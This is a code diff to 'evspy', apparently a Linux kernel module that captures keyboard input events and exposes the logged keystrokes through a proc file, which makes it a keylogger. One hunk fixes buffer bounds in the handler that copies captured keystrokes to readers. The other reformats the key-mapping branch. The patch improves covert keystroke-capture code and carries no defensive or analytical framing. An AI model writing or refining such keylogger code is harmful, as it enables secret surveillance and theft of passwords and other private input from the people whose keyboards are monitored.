@@ -47,19 +47,19 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 			*eof = 1;
 		else
 			strncpy(page, "Trololololo lololo lololo\nhohohoho\n", n);
-		return n;
 #else
 		return -EPERM;
 #endif
 	} else {		// copy fifo contents to the supplied buffer
-		n = offset + kfifo_out(&cbuffer, page+offset,
-				min((int)PAGE_SIZE, count));
+		if (offset + count > PAGE_SIZE)
+			count = PAGE_SIZE - offset;
 
-		if (n == offset)
+		n = offset + kfifo_out(&cbuffer, page+offset, count);
+
+		if (kfifo_is_empty(&cbuffer))
 			*eof = 1;
-
-		return n;
 	}
+	return n;
 }
 
 /*
@@ -160,7 +160,8 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 		return;
 
 	// Special/unknown keys (alt, ctrl, esc, shift, etc)
-	} else if (code >= sizeof(map) || (map[code] == '.' && likely(code != KEY_DOT))) {
+	} else if (code >= sizeof(map) || (map[code] == '.' &&
+				likely(code != KEY_DOT))) {
 		special_char(code, value);
 
 	// "Immediate" keys (alphanumeric + some symbols)
